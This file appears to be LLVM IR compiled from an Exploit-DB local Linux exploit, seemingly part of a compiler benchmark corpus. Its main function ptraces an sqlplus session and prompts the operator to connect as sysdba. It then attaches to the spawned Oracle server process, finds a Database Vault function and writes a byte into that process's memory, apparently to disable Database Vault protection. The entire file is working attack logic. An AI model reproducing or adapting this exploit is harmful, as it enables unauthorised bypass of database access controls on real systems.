; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_7177.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_7177.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.user_regs_struct = type { i64 }

@child = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"fork\00", align 1
@PTRACE_TRACEME = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"unable to ptrace(PTRACE_TRACEME)\00", align 1
@sqlplus = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [8 x i8] c"sqlplus\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"/nolog\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"execl\00", align 1
@cleanup = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [42 x i8] c"[%d] unable to register cleanup function\0A\00", align 1
@.str.6 = private unnamed_addr constant [45 x i8] c"[%d] starting to trace sqlplus process (%d)\0A\00", align 1
@.str.7 = private unnamed_addr constant [45 x i8] c"[***] NOW TYPE IN SQLPLUS: conn / as sysdba\0A\00", align 1
@PTRACE_SYSCALL = common dso_local global i32 0, align 4
@PTRACE_GETREGS = common dso_local global i32 0, align 4
@__NR_clone = common dso_local global i64 0, align 8
@PTRACE_PEEKUSER = common dso_local global i32 0, align 4
@EAX = common dso_local global i64 0, align 8
@.str.8 = private unnamed_addr constant [57 x i8] c"ptrace(PTRACE_PEEKUSER): unable to get clone() retvalue\0A\00", align 1
@.str.9 = private unnamed_addr constant [47 x i8] c"[%d] clone() syscall in %d, tracing orapid=%d\0A\00", align 1
@PTRACE_ATTACH = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [32 x i8] c"ptrace(PTRACE_ATTACH) to orapid\00", align 1
@__NR_execve = common dso_local global i64 0, align 8
@.str.11 = private unnamed_addr constant [31 x i8] c"[%d] execve() syscall in %d, \0A\00", align 1
@PTRACE_DETACH = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [33 x i8] c"ptrace(PTRACE_DETACH) from child\00", align 1
@.str.13 = private unnamed_addr constant [29 x i8] c"[%d] execve() syscall in %d\0A\00", align 1
@.str.14 = private unnamed_addr constant [32 x i8] c"ERROR: unable to find function\0A\00", align 1
@ASM_DV_FUNC_PROLOG = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [55 x i8] c"[***] sucessfuly validated function, DatabaseVault=%d\0A\00", align 1
@.str.16 = private unnamed_addr constant [45 x i8] c"[***] attempting to rewrite memory at 0x%lx\0A\00", align 1
@.str.17 = private unnamed_addr constant [34 x i8] c"ptrace(PTRACE_DETACH) from orapid\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.user_regs_struct, align 8
  %9 = alloca i64*, align 8
  %10 = alloca i64, align 8
  %11 = alloca [32 x i8], align 16
  %12 = alloca i8, align 1
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = alloca i8, align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %16 = call i32 (...) @bfd_init()
  %17 = call i32 (...) @fork()
  store i32 %17, i32* @child, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %22

19:                                               ; preds = %2
  %20 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 @exit(i32 -1) #3
  unreachable

22:                                               ; preds = %2
  %23 = load i32, i32* @child, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %41

25:                                               ; preds = %22
  %26 = load i32, i32* @PTRACE_TRACEME, align 4
  %27 = call i32 @ptrace(i32 %26, i32 0, i64* null, %struct.user_regs_struct* null)
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %32

29:                                               ; preds = %25
  %30 = call i32 @perror(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0))
  %31 = call i32 @exit(i32 -1) #3
  unreachable

32:                                               ; preds = %25
  %33 = load i32, i32* @sqlplus, align 4
  %34 = call i32 @execl(i32 %33, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i32* null)
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %39

36:                                               ; preds = %32
  %37 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %38 = call i32 @exit(i32 -1) #3
  unreachable

39:                                               ; preds = %32
  %40 = call i32 @exit(i32 0) #3
  unreachable

41:                                               ; preds = %22
  %42 = load i32, i32* @cleanup, align 4
  %43 = call i64 @atexit(i32 %42)
  %44 = icmp ne i64 %43, 0
  br i1 %44, label %45, label %49

45:                                               ; preds = %41
  %46 = load i32, i32* @stderr, align 4
  %47 = call i32 (...) @getpid()
  %48 = call i32 (i32, i8*, ...) @fprintf(i32 %46, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.5, i64 0, i64 0), i32 %47)
  br label %49

49:                                               ; preds = %45, %41
  %50 = call i32 @wait(i32* %6)
  %51 = load i32, i32* %6, align 4
  %52 = call i64 @WIFSTOPPED(i32 %51)
  %53 = icmp ne i64 %52, 0
  br i1 %53, label %54, label %59

54:                                               ; preds = %49
  %55 = load i32, i32* @stderr, align 4
  %56 = call i32 (...) @getpid()
  %57 = load i32, i32* @child, align 4
  %58 = call i32 (i32, i8*, ...) @fprintf(i32 %55, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.6, i64 0, i64 0), i32 %56, i32 %57)
  br label %59

59:                                               ; preds = %54, %49
  %60 = load i32, i32* @stderr, align 4
  %61 = call i32 (i32, i8*, ...) @fprintf(i32 %60, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.7, i64 0, i64 0))
  br label %62

62:                                               ; preds = %152, %59
  %63 = load i32, i32* %7, align 4
  %64 = icmp ne i32 %63, 0
  %65 = xor i1 %64, true
  br i1 %65, label %66, label %153

66:                                               ; preds = %62
  %67 = load i32, i32* @PTRACE_SYSCALL, align 4
  %68 = load i32, i32* @child, align 4
  %69 = call i32 @ptrace(i32 %67, i32 %68, i64* null, %struct.user_regs_struct* null)
  %70 = call i32 @wait(i32* %6)
  %71 = load i32, i32* @PTRACE_GETREGS, align 4
  %72 = load i32, i32* @child, align 4
  %73 = call i32 @ptrace(i32 %71, i32 %72, i64* null, %struct.user_regs_struct* %8)
  %74 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %8, i32 0, i32 0
  %75 = load i64, i64* %74, align 8
  %76 = load i64, i64* @__NR_clone, align 8
  %77 = icmp eq i64 %75, %76
  br i1 %77, label %78, label %141

78:                                               ; preds = %66
  store i64* null, i64** %9, align 8
  %79 = load i32, i32* @PTRACE_SYSCALL, align 4
  %80 = load i32, i32* @child, align 4
  %81 = call i32 @ptrace(i32 %79, i32 %80, i64* null, %struct.user_regs_struct* null)
  %82 = call i32 @wait(i32* %6)
  %83 = load i32, i32* @PTRACE_PEEKUSER, align 4
  %84 = load i32, i32* @child, align 4
  %85 = load i64*, i64** %9, align 8
  %86 = load i64, i64* @EAX, align 8
  %87 = getelementptr inbounds i64, i64* %85, i64 %86
  %88 = call i32 @ptrace(i32 %83, i32 %84, i64* %87, %struct.user_regs_struct* null)
  store i32 %88, i32* %7, align 4
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %90, label %93

90:                                               ; preds = %78
  %91 = call i32 @perror(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.8, i64 0, i64 0))
  %92 = call i32 @exit(i32 -1) #3
  unreachable

93:                                               ; preds = %78
  %94 = load i32, i32* @stderr, align 4
  %95 = call i32 (...) @getpid()
  %96 = load i32, i32* @child, align 4
  %97 = load i32, i32* %7, align 4
  %98 = call i32 (i32, i8*, ...) @fprintf(i32 %94, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.9, i64 0, i64 0), i32 %95, i32 %96, i32 %97)
  %99 = load i32, i32* @PTRACE_ATTACH, align 4
  %100 = load i32, i32* %7, align 4
  %101 = call i32 @ptrace(i32 %99, i32 %100, i64* null, %struct.user_regs_struct* null)
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %106

103:                                              ; preds = %93
  %104 = call i32 @perror(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.10, i64 0, i64 0))
  %105 = call i32 @exit(i32 -1) #3
  unreachable

106:                                              ; preds = %93
  br label %107

107:                                              ; preds = %106, %131
  %108 = load i32, i32* @PTRACE_SYSCALL, align 4
  %109 = load i32, i32* %7, align 4
  %110 = call i32 @ptrace(i32 %108, i32 %109, i64* null, %struct.user_regs_struct* null)
  %111 = call i32 @wait(i32* %6)
  %112 = load i32, i32* @PTRACE_GETREGS, align 4
  %113 = load i32, i32* %7, align 4
  %114 = call i32 @ptrace(i32 %112, i32 %113, i64* null, %struct.user_regs_struct* %8)
  %115 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %8, i32 0, i32 0
  %116 = load i64, i64* %115, align 8
  %117 = load i64, i64* @__NR_execve, align 8
  %118 = icmp eq i64 %116, %117
  br i1 %118, label %119, label %127

119:                                              ; preds = %107
  %120 = load i32, i32* @stderr, align 4
  %121 = call i32 (...) @getpid()
  %122 = load i32, i32* %7, align 4
  %123 = call i32 (i32, i8*, ...) @fprintf(i32 %120, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.11, i64 0, i64 0), i32 %121, i32 %122)
  %124 = load i32, i32* @PTRACE_SYSCALL, align 4
  %125 = load i32, i32* %7, align 4
  %126 = call i32 @ptrace(i32 %124, i32 %125, i64* null, %struct.user_regs_struct* null)
  br label %132

127:                                              ; preds = %107
  %128 = load i32, i32* @PTRACE_SYSCALL, align 4
  %129 = load i32, i32* %7, align 4
  %130 = call i32 @ptrace(i32 %128, i32 %129, i64* null, %struct.user_regs_struct* null)
  br label %131

131:                                              ; preds = %127
  br label %107

132:                                              ; preds = %119
  %133 = load i32, i32* @PTRACE_DETACH, align 4
  %134 = load i32, i32* @child, align 4
  %135 = call i32 @ptrace(i32 %133, i32 %134, i64* null, %struct.user_regs_struct* null)
  %136 = icmp eq i32 %135, -1
  br i1 %136, label %137, label %140

137:                                              ; preds = %132
  %138 = call i32 @perror(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.12, i64 0, i64 0))
  %139 = call i32 @exit(i32 -1) #3
  unreachable

140:                                              ; preds = %132
  br label %152

141:                                              ; preds = %66
  %142 = getelementptr inbounds %struct.user_regs_struct, %struct.user_regs_struct* %8, i32 0, i32 0
  %143 = load i64, i64* %142, align 8
  %144 = load i64, i64* @__NR_execve, align 8
  %145 = icmp eq i64 %143, %144
  br i1 %145, label %146, label %151

146:                                              ; preds = %141
  %147 = load i32, i32* @stderr, align 4
  %148 = call i32 (...) @getpid()
  %149 = load i32, i32* @child, align 4
  %150 = call i32 (i32, i8*, ...) @fprintf(i32 %147, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.13, i64 0, i64 0), i32 %148, i32 %149)
  br label %151

151:                                              ; preds = %146, %141
  br label %152

152:                                              ; preds = %151, %140
  br label %62

153:                                              ; preds = %62
  %154 = call i64 (...) @locate_dv_func()
  store i64 %154, i64* %10, align 8
  %155 = load i64, i64* %10, align 8
  %156 = icmp eq i64 %155, 0
  br i1 %156, label %157, label %161

157:                                              ; preds = %153
  %158 = load i32, i32* @stderr, align 4
  %159 = call i32 (i32, i8*, ...) @fprintf(i32 %158, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.14, i64 0, i64 0))
  %160 = call i32 @exit(i32 -1) #3
  unreachable

161:                                              ; preds = %153
  %162 = call i32 @wait(i32* %6)
  %163 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %164 = call i32 @memset(i8* %163, i32 0, i32 32)
  %165 = load i32, i32* %7, align 4
  %166 = load i64, i64* %10, align 8
  %167 = bitcast [32 x i8]* %11 to i8*
  %168 = call i32 @getdata(i32 %165, i64 %166, i8* %167, i32 32)
  %169 = getelementptr inbounds [32 x i8], [32 x i8]* %11, i64 0, i64 0
  %170 = load i32, i32* @ASM_DV_FUNC_PROLOG, align 4
  %171 = load i32, i32* @ASM_DV_FUNC_PROLOG, align 4
  %172 = call i64 @strlen(i32 %171)
  %173 = call i32 @memcmp(i8* %169, i32 %170, i64 %172)
  %174 = icmp ne i32 %173, 0
  br i1 %174, label %194, label %175

175:                                              ; preds = %161
  %176 = load i64, i64* %10, align 8
  %177 = load i32, i32* @ASM_DV_FUNC_PROLOG, align 4
  %178 = call i64 @strlen(i32 %177)
  %179 = add nsw i64 %176, %178
  store i64 %179, i64* %13, align 8
  %180 = load i64, i64* %13, align 8
  store i64 %180, i64* %14, align 8
  %181 = load i32, i32* %7, align 4
  %182 = load i64, i64* %13, align 8
  %183 = call i32 @getdata(i32 %181, i64 %182, i8* %12, i32 1)
  %184 = load i32, i32* @stderr, align 4
  %185 = load i8, i8* %12, align 1
  %186 = zext i8 %185 to i32
  %187 = call i32 (i32, i8*, ...) @fprintf(i32 %184, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.15, i64 0, i64 0), i32 %186)
  %188 = load i32, i32* @stderr, align 4
  %189 = load i64, i64* %14, align 8
  %190 = call i32 (i32, i8*, ...) @fprintf(i32 %188, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.16, i64 0, i64 0), i64 %189)
  store i8 0, i8* %15, align 1
  %191 = load i32, i32* %7, align 4
  %192 = load i64, i64* %14, align 8
  %193 = call i32 @putdata(i32 %191, i64 %192, i8* %15, i32 1)
  br label %194

194:                                              ; preds = %175, %161
  %195 = load i32, i32* @PTRACE_DETACH, align 4
  %196 = load i32, i32* %7, align 4
  %197 = call i32 @ptrace(i32 %195, i32 %196, i64* null, %struct.user_regs_struct* null)
  %198 = icmp eq i32 %197, -1
  br i1 %198, label %199, label %202

199:                                              ; preds = %194
  %200 = call i32 @perror(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.17, i64 0, i64 0))
  %201 = call i32 @exit(i32 -1) #3
  unreachable

202:                                              ; preds = %194
  %203 = call i32 @wait(i32* %6)
  %204 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @bfd_init(...) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @ptrace(i32, i32, i64*, %struct.user_regs_struct*) #1

declare dso_local i32 @execl(i32, i8*, i8*, i32*) #1

declare dso_local i64 @atexit(i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i64 @WIFSTOPPED(i32) #1

declare dso_local i64 @locate_dv_func(...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @getdata(i32, i64, i8*, i32) #1

declare dso_local i32 @memcmp(i8*, i32, i64) #1

declare dso_local i64 @strlen(i32) #1

declare dso_local i32 @putdata(i32, i64, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
